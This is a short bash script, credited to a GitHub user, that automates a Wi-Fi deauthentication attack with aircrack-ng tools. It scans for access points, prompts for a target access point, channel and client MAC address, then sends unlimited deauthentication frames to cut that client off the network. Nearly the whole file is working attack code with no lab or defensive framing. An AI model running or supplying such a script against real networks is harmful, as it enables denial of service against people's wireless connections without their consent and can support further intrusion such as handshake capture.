#! /bin/bash

if [[ -z $1 ]]; then
        printf "Enter monitoring interface!\n"
        exit 1
fi

echo "Scanning for SSIDs"

echo "Press CTRL C to stop"

sleep 3

sudo airodump-ng $1

read -p "SSID MAC address: " ssid

read -p "SSID channel number: " chan

clear

echo "Initiating target SSID scan"

sleep 3

sudo airodump-ng -d $ssid -c $chan $1

read -p "Target MAC address: " targ

clear

echo "Deauthing target, press CTRL C to stop attack..."

sleep 3

sudo aireplay-ng -0 0 -a $ssid -c $targ $1

clear

echo "Created by https://github.com/mcgregol"
